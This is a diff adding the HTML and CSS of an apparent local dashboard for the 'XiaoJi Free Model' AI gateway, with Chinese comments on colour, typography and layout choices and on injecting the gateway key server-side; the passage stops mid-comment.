@@ -1,0 +1,3012 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light">
+<!-- 内嵌图标: 不写的话浏览器会自动去请求 /favicon.ico, 在控制台留下一条 401 报错(像 Key 出了问题) -->
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23ffd84d'/%3E%3Cellipse cx='16' cy='21' rx='8.4' ry='6.8' fill='%23ffc61a'/%3E%3Ccircle cx='16' cy='11.6' r='6.2' fill='%23ffce33'/%3E%3Cpath d='M13.6 5.6c.4-1.2 1.7-1.5 2.4-.7.8-.7 2-.1 1.9.9' stroke='%23f5a800' stroke-width='1.4' stroke-linecap='round' fill='none'/%3E%3Ccircle cx='13.4' cy='11.2' r='1.15' fill='%234a3210'/%3E%3Ccircle cx='18.6' cy='11.2' r='1.15' fill='%234a3210'/%3E%3Cpath d='M16 13.4l-2.2 2h4.4L16 13.4z' fill='%23ff8a1f'/%3E%3Cpath d='M13.9 15.6h4.2L16 17.8l-2.1-2.2z' fill='%23e8720a'/%3E%3C/svg%3E">
+<title>小鸡免费模型 · XiaoJi Free Model</title>
+<!-- 网关 Key 由服务端返回本页时把 __GATEWAY_KEY__ 替换成真实值注入。
+     走 HTML 注入而不是 /api/state，是为了让那个免鉴权接口只回掩码 —— 否则本机任何脚本
+     都能读到明文 Key 并调用全部写接口。直接用文件方式打开本页时占位符不会被替换。 -->
+<script>window.__GK__='__GATEWAY_KEY__'</script>
+<style>
+  :root{
+    color-scheme: light;
+    /* 配色：回归用户认可的「蓝白信号台」（2026-09-19 用户原话"还是没之前好看"/"改回蓝色简约的"）。
+       黄色主题连试 4 版都不过关（暖米黄→饱和黄→全染黄→亮黄），用户最终要的就是
+       **蓝色页面 + 黄色小黄鸡 logo**。所以：整页配色回到最初的信号台蓝，
+       logo 单独保留为小黄鸡（黄色 chick + 奶白徽标 + 深蓝顶栏，三色对比鲜明，不冲突）。 */
+    --bg:#f3f6fb; --card:#fff; --card2:#f8faff; --field:#eef3fa;
+    --text:#152033; --sub:#68758a; --faint:#96a2b5;
+    --line:#dfe7f1; --line-soft:#edf1f6;
+    --ink:#112a4d; --ink-2:#1e4f8f; --accent:#0c72e7; --accent-h:#075fca; --accent-bg:#eaf4ff; --accent-border:#c9dcf5;
+    /* ── 状态色 ── */
+    --ok:#18864b; --ok-bg:#eaf7ee;
+    --err:#c4313b; --err-bg:#fdeced; --err-border:#f0c4c6;
+    --warn:#a96808; --warn-bg:#fdf4e7;
+    /* ── 装饰 ── */
+    --dot-off:#c7c7cc;
+    /* 目录标签的字色。底不在这里 —— 第四轮改成"白底 + 1px 细边框"直接写在 .chip 里
+       （见「目录」段）：实心底两版都试过，不是糊成灰墙就是读成一段话。 */
+    --chip-fg:#3c4d66;
+    /* ── 字号 4 档 ──
+       2026-09-25 收敛：原来 13 档字号（9/9.5/10/10.5/11/11.5/12/12.5/13/13.5/14/15/19px）里
+       97.7% 的文字挤在 10–11.5px 这 1.5px 区间，而 0.5px 的差人眼分辨不出 —— 结果就是
+       "所有内容一样重、眼睛无处落脚"。层级改由**字重 + 颜色**承担，字号只留 4 档。 */
+    --fs-1:10.5px; /* 辅助：label / meta / hint / 徽标 / chip */
+    --fs-2:11.5px; /* 正文：描述 / 列表 / 按钮 / 输入 */
+    --fs-3:14px;   /* 标题：卡片标题 */
+    --fs-4:21px;   /* 数字：统计条关键值 */
+    --r-lg:16px; --r-md:12px; --r-sm:9px;
+    --shadow:0 1px 2px rgba(18,42,77,.05),0 7px 20px rgba(32,73,124,.05);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  ::-webkit-scrollbar{width:8px;height:8px}
+  ::-webkit-scrollbar-thumb{background:#d2d2d7;border-radius:99px;border:2px solid transparent;background-clip:content-box}
+  ::-webkit-scrollbar-thumb:hover{background:#b8b8be;background-clip:content-box}
+  ::-webkit-scrollbar-track{background:transparent}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:radial-gradient(900px 520px at 88px -90px,#e8f3ff 0,rgba(232,243,255,0) 67%),var(--bg);
+    color:var(--text);
+    max-width:1380px; margin:0 auto; padding:0 20px 40px;
+    -webkit-font-smoothing:antialiased; line-height:1.4;
+    font-size:var(--fs-2);
+  }
+  /* 选中样式用主题蓝，柔和高亮，比浏览器默认更克制 */
+  ::selection{background:#d4e7fb;color:var(--ink)}
+  @keyframes rise{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+  .reveal{animation:rise .35s cubic-bezier(.22,.61,.36,1) both}
+  @media (prefers-reduced-motion:reduce){*,*:before,*:after{animation-duration:.01ms!important;scroll-behavior:auto!important;transition-duration:.01ms!important}}
+
+  /* ── 顶栏 ─────────────────────────── */
+  .topbar{
+    position:sticky; top:0; z-index:50; display:flex; align-items:center; gap:13px;
+    margin:0 -20px 15px; padding:11px 26px;
+    color:#fff;
+    /* 同时给 background-color 与 gradient: 渐变色只写在 background-image 里的话, 这个元素的
+       computed backgroundColor 是透明的 —— 靠"逐层合成背景"做可读性校验时会一路穿到白底,
+       把顶栏上的白色文字误判成"白底白字"。给一个同色系的实色兜底既让校验算得对,
+       也让不支持渐变的渲染器不至于变成一条白栏。 */
+    /* 顶栏回到用户认可的深海蓝渐变 —— 上版改成近黑/中性后被嫌"配色丑", 蓝色才是产品基色。
+       黄色小鸡 logo 摆在深蓝顶栏上对比鲜明, 完全不冲突 —— 这就是用户要的搭配。 */
+    background-color:var(--ink);
+    background-image:linear-gradient(102deg,var(--ink) 0%,#17406f 56%,#1b4d86 100%);
+    box-shadow:0 6px 18px rgba(14,44,87,.13);
+  }
+  /* 顶栏底部一条极细的渐变强调线, 代替原来的大装饰圆环与波形图 —— 保留识别度, 不抢内容。
+     用户的反馈是"不能乱七八糟", 所以装饰只留这一条。 */
+  /* 底边一条极淡的白色高光线：金色细线在深蓝上虽不丑，但用户已经明确不要黄色元素，
+     这里改成白色既干净又把顶栏和内容区切开。 */
+  .topbar:after{content:"";position:absolute;left:0;right:0;bottom:0;height:1px;background:linear-gradient(90deg,rgba(255,255,255,0),rgba(255,255,255,.30),rgba(255,255,255,0))}
+  .topbar .logo{position:relative;z-index:1;display:flex;align-items:center;gap:10px;font-size:var(--fs-3);font-weight:680;letter-spacing:-.018em}
+  .topbar .logo-en{font-size:var(--fs-1);font-weight:500;color:rgba(255,255,255,.58);letter-spacing:.065em;text-transform:uppercase}
+  /* 小黄鸡徽标: 奶白底(带一点暖) + 内高光。底色不用黄 —— 小黄鸡本身就是黄的,
+     黄底上放黄鸡等于看不见。奶白徽标放在深蓝顶栏上, 黄/白/深蓝三色对鲜明。 */
+  .topbar .mark{width:28px;height:28px;border-radius:10px;background:linear-gradient(140deg,var(--card),#fff1cf);box-shadow:inset 0 1px rgba(255,255,255,.7),0 2px 6px rgba(0,0,0,.16);display:inline-flex;align-items:center;justify-content:center;overflow:hidden}
+  .topbar .mark svg{width:20px;height:20px;display:block}
+  .topbar .tagline{position:relative;z-index:1;font-size:var(--fs-2);color:rgba(255,255,255,.73)}
+  .topbar .live{position:relative;z-index:1;margin-left:auto;display:inline-flex;align-items:center;gap:6px;color:#fff;background:rgba(255,255,255,.10);border:1px solid rgba(255,255,255,.18);padding:5px 11px;border-radius:980px;font-size:var(--fs-1);font-weight:600;backdrop-filter:blur(8px)}
+  .dot{width:6px;height:6px;border-radius:50%;background:#65e99d;flex:0 0 auto;box-shadow:0 0 0 3px rgba(101,233,157,.12)}
+  .dot.bad{background:#ff7b7b;box-shadow:none}
+
+  /* ── 双栏网格 ─────────────────────── */
+  /* 列宽 1.3:1 → 1:1.2（2026-09-25）：右列装的是整条"供给链"（添加 / 目录 / 发现 / 池变动），
+     卡片更多、模型名更长；左列只有 3 张卡。把宽度让给右列，模型 chips 一行能多放一两个，
+     整列反而变矮 —— 比单纯往下压信息量划算。 */
+  /* 两列平分（2026-09-25）：原来是 1:1.2，左列被压到 517px —— 供应商行的操作按钮被挤、
+     统计条 6 格每格只剩 80px（时间格折行）。用户明确要求"平分"。 */
+  .grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:9px;align-items:start}
+  .col{display:flex;flex-direction:column;gap:10px;min-width:0}
+
+  /* ── 卡片 ─────────────────────────── */
+  .card{position:relative;background:var(--card);border:1px solid var(--line);border-radius:var(--r-lg);padding:13px 15px;box-shadow:var(--shadow);transition:border-color .18s,box-shadow .18s}
+  .card:not(.hero):hover{border-color:#d2e1f3;box-shadow:0 2px 4px rgba(18,42,77,.05),0 16px 36px rgba(32,73,124,.085)}
+  /* ⚠ 每张 .card 都带 .reveal 动画(animation-fill-mode:both), 会各自形成层叠上下文,
+     于是"后出现的卡片"会盖住"前面的卡片里溢出的浮层" —— 厂商选择器的下拉就这样被
+     下面的「免费模型目录」压住了。给带下拉的卡片单独提一层即可。 */
+  #addcard{position:relative;z-index:10}
+  .card.hero{overflow:hidden;background:linear-gradient(116deg,#f8fbff 0%,#eef6ff 100%);border-color:#cfe3fb}
+  /* 卡片标题统一带一条发丝分隔线: 一屏十几张卡片时, 靠结构而不是靠颜色来分组 ——
+     这是"不能五颜六色, 但也不能只剩一个色"最稳的解法。 */
+  .card h2{position:relative;font-size:var(--fs-3);font-weight:650;letter-spacing:-.018em;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+  .card:not(.hero) h2{padding-bottom:8px;border-bottom:1px solid var(--line-soft)}
+  .card h2+*{margin-top:9px}
+  .card .desc{font-size:var(--fs-2);color:var(--sub);margin-top:6px;line-height:1.6}
+  .eyebrow{display:flex;align-items:center;gap:6px;color:var(--accent);font-size:var(--fs-1);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:5px}
+  .eyebrow:before{content:"";width:18px;height:2px;background:var(--accent);border-radius:2px}
+  .spacer{flex:1}
+  .meta{font-size:var(--fs-1);font-weight:400;color:var(--faint)}
+
+  /* ── 统一出口 ─────────────────────── */
+  .connect{position:relative;display:flex;flex-direction:column;border:1px solid #d5e4f5;border-radius:var(--r-md);overflow:hidden;background:rgba(255,255,255,.84);box-shadow:0 5px 16px rgba(22,74,132,.045)}
+  .kv{display:flex;align-items:center;gap:10px;padding:8px 11px;border-bottom:1px solid #e6eff8;background:transparent}
+  .kv:first-child{background:linear-gradient(90deg,rgba(12,114,231,.06),rgba(12,114,231,0) 58%);box-shadow:inset 3px 0 0 var(--accent)}
+  .kv:last-child{border-bottom:none;background:#f8fbff}
+  .kv .lbl{flex:0 0 66px;font-size:var(--fs-1);font-weight:700;letter-spacing:.065em;color:var(--sub);text-transform:uppercase}
+  .kv code{flex:1;font-family:ui-monospace,"SF Mono",Consolas,monospace;font-size:var(--fs-2);word-break:break-all;letter-spacing:-.015em;color:var(--ink)}
+  .kv .tag{font-size:var(--fs-1);color:var(--accent);background:var(--accent-bg);padding:2px 7px;border-radius:980px;font-weight:650;flex:0 0 auto}
+  .hint{font-size:var(--fs-2);color:var(--sub);margin-top:7px;line-height:1.5}
+  /* 说明行里的路径不再套胶囊（2026-10-17）：一句话里 4 个带边框的小方块，读起来是一地碎屑。
+     等宽字体 + 更深的墨色已经足够表达"这是可以直接抄的路径"，胶囊是多余的一层框。 */
+  .hint code{background:transparent;border:none;padding:0;font-size:var(--fs-2);color:var(--ink);font-weight:500;font-family:ui-monospace,Consolas,monospace}
+
+  /* ── 统计条 ───────────────────────── */
+  .stats{display:grid;grid-template-columns:repeat(6,1fr);gap:7px}
+  .stat{position:relative;overflow:hidden;background:rgba(255,255,255,.86);border:1px solid var(--line);border-radius:var(--r-md);padding:9px 10px;box-shadow:0 4px 12px rgba(24,57,100,.03);transition:box-shadow .2s}
+  .stat:hover{box-shadow:0 6px 18px rgba(24,57,100,.07)}
+  /* 统计条 6 格是**并列**关系，所以不给任何一格加左侧强调条（2026-09-26 删）：
+     原来只有 :first-child（"请求"）有一条 3px 蓝色竖条，并排 6 个格子里只有第一个带条 ——
+     读起来像"这格被选中了 / 这格有异常"，而不是"这格是总量"。要么 6 格都有、要么都没有，
+     而这个位置给"请求"并不比给"成功"更合理，所以选"都没有"。 */
+  .stat .k{font-size:var(--fs-1);font-weight:700;letter-spacing:.065em;color:var(--sub);margin-bottom:4px;text-transform:uppercase}
+  .stat .v{font-size:var(--fs-4);font-weight:650;letter-spacing:-.03em;font-variant-numeric:tabular-nums;line-height:1.15;color:var(--ink)}
+  .stat .v small{font-size:var(--fs-1);font-weight:400;color:var(--faint);letter-spacing:0}
+  .stat .v.ok{color:var(--ok)} .stat .v.err{color:var(--err)} .stat .v.warn{color:var(--warn)}
+  .stat .v.xs{font-size:var(--fs-1);font-weight:400;color:var(--sub);line-height:1.5;padding-top:3px;font-variant-numeric:tabular-nums}
+  /* 「失败」格的副行: 顶部失败是 0、但链上有候选失败被回退救回时, 这一行负责说清楚
+     "不是没出过问题, 是问题都被自动兜住了" —— 否则用户会以为统计坏了。 */
+  .stat .v .sub{display:block;font-size:var(--fs-1);font-weight:400;color:var(--faint);letter-spacing:0;margin-top:2px;font-variant-numeric:tabular-nums}
+  .stat .v .sub b{color:var(--warn);font-weight:650}
+  /* 进程级统计全 0 时（网关刚启动、还没接过调用）把前四格合并成一格：
+     四个 0 并排会和**同屏**供应商卡片的全期数字（成功 367 / 失败 30）打架，
+     用户看到的是"网关坏了"，而事实只是"这个进程刚起来"。 */
+  .stat.wide{grid-column:span 4}
+
+  /* ── 表单 ─────────────────────────── */
+  label{font-size:var(--fs-2);font-weight:600;letter-spacing:.02em;color:var(--sub);display:block;margin-bottom:4px}
+  input,select{
+    width:100%;padding:8px 11px;border:1px solid var(--line);border-radius:var(--r-sm);font-size:var(--fs-2);
+    background:var(--card);color:var(--text);font-family:inherit;transition:border-color .15s,box-shadow .15s
+  }
+  input::placeholder{color:var(--faint)}
+  input:focus,select:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb, var(--accent) 16%, transparent)}
+  .row{display:flex;gap:10px;flex-wrap:wrap}
+  .row>div{flex:1;min-width:140px}
+
+  /* ── 按钮 ─────────────────────────── */
+  /* 主按钮是黄底 + 深棕字。黄底配白字对比度只有 2 左右, 等于把按钮做成"看不清"。 */
+  button{
+    background:var(--accent);color:#fff;border:none;border-radius:980px;
+    padding:7px 15px;font-size:var(--fs-2);font-weight:600;letter-spacing:-.01em;cursor:pointer;font-family:inherit;
+    transition:background .15s
+  }
+  /* ⚠ 这条只给"主按钮"(蓝底白字)用。变体按钮(.gray/.danger/.tiny/.snip-tab/.tab/.vbtn)必须
+     自己写 hover 背景 —— 否则会继承这条蓝底, 而它们的文字颜色不是白色, 悬停时就是"蓝底看不清字"
+     (用户截图反馈过: 配置片段里鼠标划过某个 tab, 整块变蓝、字几乎看不见)。
+     用 :not() 逐个排除, 比给每个变体补一条覆盖更不容易漏。 */
+  button:hover:not(.gray):not(.danger):not(.tiny):not(.snip-tab):not(.tab):not(.vbtn){background:var(--accent-h)}
+  button:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+  /* 置灰的按钮必须有明确的视觉反馈, 否则用户会以为是"点了没反应"而不是"这一步不允许"。
+     只调透明度和光标, 不动 hover 背景 —— 否则会把主按钮(蓝底)在 disabled 时变成透明。 */
+  button:disabled,button[disabled]{opacity:.42;cursor:not-allowed}
+  button.gray{background:transparent;color:var(--accent);border:1px solid var(--line);padding:6px 12px;font-weight:500}
+  /* hover 时文字要跟着变深: 底色变浅蓝之后仍用原来的 #0c72e7, 对比度只有 4.1(低于 AA 的 4.5)。
+     用户提过"悬停看不清字", 所以这类浅底浅字的组合一律把文字压深一档。 */
+  button.gray:hover{background:var(--accent-bg);border-color:var(--accent-border);color:var(--accent-h)}
+  button.small{padding:5px 11px;font-size:var(--fs-2)}
+  button.danger{background:transparent;color:var(--err);border:1px solid var(--line)}
+  button.danger:hover{background:var(--err-bg);border-color:var(--err-border)}
+  button.tiny{padding:3px 9px;font-size:var(--fs-2);background:var(--card);color:var(--accent);border:1px solid var(--line)}
+  button.tiny:hover{background:var(--accent-bg);color:var(--accent-h)}
+
+  /* ── 供应商卡片 ───────────────────── */
+  .plist{display:flex;flex-direction:column;gap:10px}
+  /* 默认折叠: 一屏 7 家供应商时全部铺开就把左列压到 1500px, 完全扫不动;
+     默认单行让用户一眼看到哪家在告警, 想管哪家再展开 —— 大幅缩短首屏 */
+  .prow{border:1px solid var(--line);border-radius:var(--r-md);background:var(--card);padding:8px 11px;transition:border-color .15s,box-shadow .15s}
+  .prow:hover{border-color:var(--accent-border);box-shadow:0 3px 12px rgba(24,57,100,.055)}
+  .prow.dim{opacity:.6}
+  .prow-toggle{
+    width:18px;height:18px;border-radius:6px;border:1px solid var(--line);background:transparent;color:var(--faint);
+    display:inline-flex;align-items:center;justify-content:center;cursor:pointer;font:inherit;font-size:var(--fs-1);
+    padding:0;transition:transform .18s,color .15s,border-color .15s;flex:0 0 auto
+  }
+  .prow-toggle:hover{color:var(--accent);border-color:var(--accent-border)}
+  .prow-toggle.rot{transform:rotate(180deg);color:var(--accent);border-color:var(--accent-border)}
+  .prow-body{margin-top:8px;padding-top:8px;border-top:1px solid var(--line-soft);animation:rise .22s cubic-bezier(.22,.61,.36,1) both}
+  .prow .ptop{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+  .avatar{width:26px;height:26px;border-radius:8px;flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:var(--fs-2);font-weight:600;background:#3a3a3c;overflow:hidden}
+  /* 「l」= logo 模式: 拿到厂商 logo 时白底铺一张小图。simple-icons 的 SVG 大多 fill=currentColor
+     单色, 在白底 + 居中 + object-fit:contain 下就是个品牌图形; 失败时由 onerror 回退到首字母方块。 */
+  .avatar.l{background:#fff}
+  .avatar.l img{width:100%;height:100%;display:block;object-fit:contain}
+  .avatar.l.off img{filter:grayscale(.6);opacity:.55}
+  .avatar.off{background:var(--dot-off)}
+  .prow .nm{font-weight:600;font-size:var(--fs-2);letter-spacing:-.012em}
+  .prow .pops{margin-left:auto;display:flex;gap:4px;flex-wrap:wrap}
+  /* ── 供应商行操作按钮降噪（2026-09-25）──
+     每行 5 颗带边框按钮 × 7 行 —— 供应商卡一张就贡献了全页 138 个按钮里的 120 个，
+     首屏最吵的视觉噪音就是它们。功能一个不删，只去掉"每颗都是一颗按钮"的观感：
+     默认无边框、淡色，hover 该行才浮出完整按钮。
+     刻意**不做 display:none / opacity:0** —— 触屏没有 hover，隐藏等于把功能藏掉；
+     border 保持 1px 只换颜色，尺寸不变，hover 时不会跳。 */
+  /* 按钮内边距收到 9px（2026-09-25）：5 个按钮 × 7 行 = 35 个，是行内最占宽的一块。
+     原来 11px 时「长厂商名 + 已拉黑徽标」这种组合会超出行宽，把那一行折成两行 ——
+     实测 7 行里只有 gemini 一行 84px，其余 50px，看着像坏了。收 2px 后最长组合仍有 ~15px 余量。 */
+  .prow .pops button{padding:5px 9px;border-color:transparent;background:transparent;color:var(--sub)}
+  .prow .pops button.danger{color:var(--sub)}
+  .prow:hover .pops button{border-color:var(--line);background:var(--card);color:var(--accent)}
+  .prow:hover .pops button:hover{background:var(--accent-bg);border-color:var(--accent-border);color:var(--accent-h)}
+  .prow:hover .pops button.danger{color:var(--err);border-color:var(--err-border)}
+  .prow:hover .pops button.danger:hover{background:var(--err-bg)}
+  .pstate{display:inline-flex;align-items:center;gap:5px;font-size:var(--fs-2);font-weight:500;color:var(--sub)}
+  .pstate.ok{color:var(--ok)} .pstate.err{color:var(--err)} .pstate.cd{color:var(--warn)}
+  /* warn = "偶发失败"：该家还能用（还有可用模型），只是最近一次调用在上游失败了。
+     刻意用橙不用红 —— 红留给"这家用不了了"，否则 7 行里 4 行飘红，看着像网关坏了。 */
+  .pstate.warn{color:var(--warn)}
+  /* idle = "近 7 天没有真实调用"（auto 没选中它）。**刻意用中性灰**：这不是故障，是"没有样本"
+     —— 用橙色会和真失败混成一片（2026-09-26 第八轮：实测 5/7 家被误标橙）。 */
+  .pstate.idle{color:var(--sub)}
+  .sdot{width:7px;height:7px;border-radius:50%;background:var(--ok);flex:0 0 auto}
+  .sdot.err{background:var(--err)} .sdot.cd{background:var(--warn)} .sdot.warn{background:var(--warn)} .sdot.off{background:var(--dot-off)} .sdot.idle{background:var(--dot-off)}
+  .pmeta{margin-top:6px;font-size:var(--fs-1);color:var(--faint);font-family:ui-monospace,Consolas,monospace;display:flex;gap:6px;flex-wrap:wrap}
+  .pmeta i{font-style:normal;color:var(--line)}
+  .pmodels{margin-top:9px;display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+  .pmodels .plabel{font-size:var(--fs-1);color:var(--sub);font-weight:500;margin-right:2px}
+  /* 供应商展开后的模型开关：名字同「免费模型目录」的 .chip 一样走系统字体（2026-09-26），
+     别让同一个模型名在页面里长两副样子。 */
+  .mchip{
+    display:inline-flex;align-items:center;gap:5px;font-size:var(--fs-2);padding:3px 8px;border-radius:980px;
+    background:var(--card);border:1px solid var(--line);cursor:pointer;user-select:none;transition:.15s;
+    font-family:inherit
+  }
+  .mchip:hover{border-color:var(--accent)}
+  .mchip input{width:auto;accent-color:var(--accent);cursor:pointer;margin:0}
+  .mchip.off{opacity:.5;text-decoration:line-through;text-decoration-thickness:1px;color:var(--sub)}
+  .pfoot{margin-top:8px;padding-top:7px;border-top:1px solid var(--line-soft);display:flex;gap:14px;font-size:var(--fs-2);color:var(--sub);flex-wrap:wrap;font-variant-numeric:tabular-nums}
+  .pfoot b{color:var(--text);font-weight:600}
+  .pfoot .sweepbad{color:var(--warn);font-weight:600}
+  .pfoot .sweepok{color:var(--sub)}
+  .pfoot .sweepok b{color:var(--ok)}
+  /* 上游配额: 它是一句完整的话("剩余 123/1000 次 · 2 小时后重置"), 折行会把后半截和数字拆开,
+     读起来像两件独立的事。不折行, 让它整块换行。 */
+  .pfoot .quota{white-space:nowrap}
+  .badge{display:inline-flex;align-items:center;gap:3px;padding:2px 8px;border-radius:980px;font-size:var(--fs-1);font-weight:600;white-space:nowrap}
+  .badge.blk{background:var(--err-bg);color:var(--err)}
+  .badge.qtn{background:var(--warn-bg);color:var(--warn)}
+  /* 「已拉黑 N」= 系统拦下了 N 个实测收费/失效的模型（防扣费在正常工作的证据，不是故障）。
+     2026-09-25：原来行上挂的是「不在池 N」红/黄徽标，实测 7 家里 5 家顶着 27/32/2 这种大数字，
+     满屏红点像"到处坏了" —— 而其中 4 家 blk=0，那 27/32 只是封闭名单外的常态隔离。
+     现在隔离数不上行（展开卡片里仍有完整明细），行上只在**真有拉黑**时留一个中性徽标。 */
+  .badge.mute{background:var(--field);color:var(--sub)}
+  .badge.promo{background:var(--accent-bg);color:var(--accent)}
+  /* 「视野免费」是中性信息，不是告警 —— 用橙色会让人误以为出事了 */
+  .badge.rec{background:var(--field);color:var(--sub)}
+  .badge.ok{background:var(--ok-bg);color:var(--ok)}
+  /* 巡检/闸门自身失效的提示条：不是模型出问题，是"我们的防线可能瞎了"，必须能一眼看到 */
+  .warnnote{margin-top:6px;padding:6px 9px;background:var(--warn-bg);border-radius:var(--r-sm);font-size:var(--fs-2);color:var(--warn);line-height:1.5}
+  /* 死模型(已拉黑/已隔离): 默认只显示一行摘要, 点开才展开 —— 免得几十个 chip 把卡片撑爆 */
+  .deadline{margin-top:8px;display:flex;align-items:center;gap:8px;font-size:var(--fs-2);color:var(--sub);flex-wrap:wrap}
+  .deadline .dchip{display:inline-flex;align-items:center;gap:4px}
+  .deadline .dchip::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--warn)}
+  .deadline .dchip.blk::before{background:var(--err)}
+  .deadbody{margin-top:7px;padding:8px 10px;border-radius:var(--r-sm);background:var(--card2);border:1px solid var(--line-soft);display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+  /* 失效 / 隔离模型在这里给一层浅色底：这一处的语义就是"这些是坏的"，值得比周围重一点 */
+  .deadbody .chip.blk{background:var(--err-bg)}
+  .deadbody .chip.qtn{background:var(--warn-bg)}
+  /* 错误行是要用户读的信息，用正文字号。列表 / 徽标 / 时间戳仍留在 11px ——
+     那些是密集数据，放大只会让页面更长（实测 11px 里 8 成是 chip 和记录行，属合理密度）。 */
+  .errline{margin-top:7px;font-size:var(--fs-2);color:var(--err)}
+  /* 错误行的"陈旧"提示: lastError 只在下次成功时才被清空, 所以一个从没成功过的厂商会把
+     几天前的报错永久挂在卡片上(2026-09-21 用户就被一条 4 天前的 503 误导成"现在还在故障")。
+     不删这条信息(它有诊断价值), 只补一句"这是多久前的事"。 */
+  .errline .staleerr{color:var(--warn);margin-left:5px}
+  /* 账号级问题横幅: Key 看不到任何模型 / 接入点路径不对。与"某几个模型不在免费池"是两件不同的事,
+     必须独立成条 —— 前者是整家不可用, 后者只是池子变小, 混在一起会让人以为模型被下架了。 */
+  .accline{margin-top:8px;padding:7px 10px;font-size:var(--fs-2);line-height:1.6;color:var(--warn);
+    background:var(--warn-bg);border:1px solid #f0dfb8;border-radius:var(--r-sm)}
+  .accline b{font-weight:600}
+
+  /* ── 目录（2026-09-26 第五轮：照 Vercel AI Gateway 的 models 表重做）────────
+     前四轮把"块"的底换了个遍（分隔线 → 灰底块 → 白底细边框标签），用户仍然说丑。
+     第五轮换了参考对象 —— 不再看 OpenRouter 的**卡片**（那是"每个模型一张卡"的信息量，
+     我们没有），改看 vercel.com/ai-gateway/models 的**表**：
+       · **一个白面 + 发丝行线**，没有任何"灰底块"。灰底在界面语言里 = 禁用 / 占位，
+         7 个灰块叠起来就是"一堵待加载的墙"（实测 2x 图里 6/7 家还是失败态，
+         整片灰底只剩一行小字，看起来像坏了）
+       · **主列深色高对比，其余一律压灰** —— 层级靠**颜色对比**，不靠底块
+       · **彩色只给稀缺语义**（人家 18 行里只有 3 个绿标），其余全是灰
+     落到这里：每家 = 一条发丝线分隔的"组"；厂商名 fs-3 + ink；标签改**浅灰底、无边框**
+     （在白面上有形状，又不叠出三层底）。 */
+  /* 目录卡头的同因失败提示（2026-09-26）**复用 .warnnote** —— 它和「免费池变动」里的
+     巡检告警是同一类东西（卡内橙色提示条），没必要各写一套。 */
+  .warnnote b{font-weight:650}
+  /* 提示条里的第二行（解释句）。2026-10-04：原来靠 <br> 硬折，字色和主句一样都是 --warn，
+     整块橙成一片、主次不分。改成独立小字 + --sub，主句（哪家、什么原因）一眼可辨。 */
+  .warnnote .d{display:block;margin-top:2px;font-size:var(--fs-1);color:var(--sub);line-height:1.45}
+  /* 「降噪档」：连续失败 < 3 次（多为网络抖动、下轮自会重试）。**不用整块底色** ——
+     灰底块在界面语言里等于"禁用/占位"，会把"一条提示"误读成"一个坏掉的东西"。
+     改用左侧 2px 竖线，读起来是"页边批注"，音量低但仍在（这类告警不许隐藏）。 */
+  .warnnote.soft{background:transparent;border-left:2px solid var(--warn);border-radius:0;padding:2px 0 2px 8px;color:var(--sub)}
+  .warnnote.soft b{color:var(--warn)}
+  .catprov{border-top:1px solid var(--line-soft);padding:6px 0 0}
+  .catprov:first-child{border-top:none;padding-top:0}
+  /* 提示条出现后它就是首个子元素了 —— 第一个 .catprov 不再是 :first-child，上边线要照旧去掉 */
+  .warnnote + .catprov{border-top:none}
+  .catprov .hd{display:flex;align-items:center;gap:7px;margin-bottom:2px;line-height:1.25}
+  .catprov .nm{flex:0 1 auto;min-width:0;font-weight:650;font-size:var(--fs-3);letter-spacing:-.02em;color:var(--ink);
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  /* 厂商 logo（2026-09-26）：与供应商列表同源（assets/logos/，26 家全有），这里 18px。
+     只有字号和颜色时，7 家的"头"看起来是一样的；一个 logo 就能让视线立刻定位到某一家。 */
+  .catprov .vlogo{width:15px;height:15px;border-radius:4px;flex:0 0 auto;align-self:center;
+    object-fit:contain}
+  /* 「15/61 可用」：数字比"可用"两个字重一档就够。上一版把数字提到 fs-3 —— 比厂商名还大，
+     主次颠倒（扫这行的第一落点应该是**哪一家**，然后才是几个）。 */
+  .catprov .hd .cnt{flex:0 0 auto;font-size:var(--fs-1);color:var(--sub);white-space:nowrap}
+  .catprov .hd .cnt b{color:var(--ink);font-weight:700;letter-spacing:-.015em}
+  .catprov .chips{display:flex;gap:6px 7px;flex-wrap:wrap;align-items:center}
+  /* 窄屏不再需要"厂商名竖排"（2026-09-26）：结构改成"标题行 + 条目行"后内容本来就拿全宽，
+     长名不会再被 78px 的左列挤到标签内部折行。 */
+  /* 标签：**浅灰底、无边框**（2026-09-26 第五轮）。前四版：灰蓝实心底（糊成灰墙，因为
+     当时底下也是灰块）→ 无底纯文字（读成一段话）→ 白底细边框（因为当时底下是灰块，
+     只能靠白底"浮"起来）。现在**底回到纯白**，所以反过来 —— 浅灰底才是有形状的那个，
+     1px 边框在白面上只剩一圈虚影，纯属噪音。 */
+  .chip{font-size:var(--fs-2);padding:2px 9px;border-radius:6px;background:var(--field);color:var(--chip-fg);font-variant-numeric:tabular-nums;letter-spacing:-.004em}
+  /* 状态：只给**真正稀缺**的语义上色 —— 「限时免费」是少数模型才有的，给它蓝底徽标，
+     它就是这一屏里唯一的彩色亮点（照 OpenRouter 那个 free 绿标的思路）。
+     失效 / 隔离只改字色 + 删除线，不加底：一屏 20 个红底就是"红墙"。 */
+  /* 「推荐 / 长期免费」只靠字重 + 字色表达（2026-09-26 第五轮）。
+     原来是一个 ⭐ 前缀 —— 但排序把推荐项全排在前面（rank: rec 优先），**默认铺的 6 个里
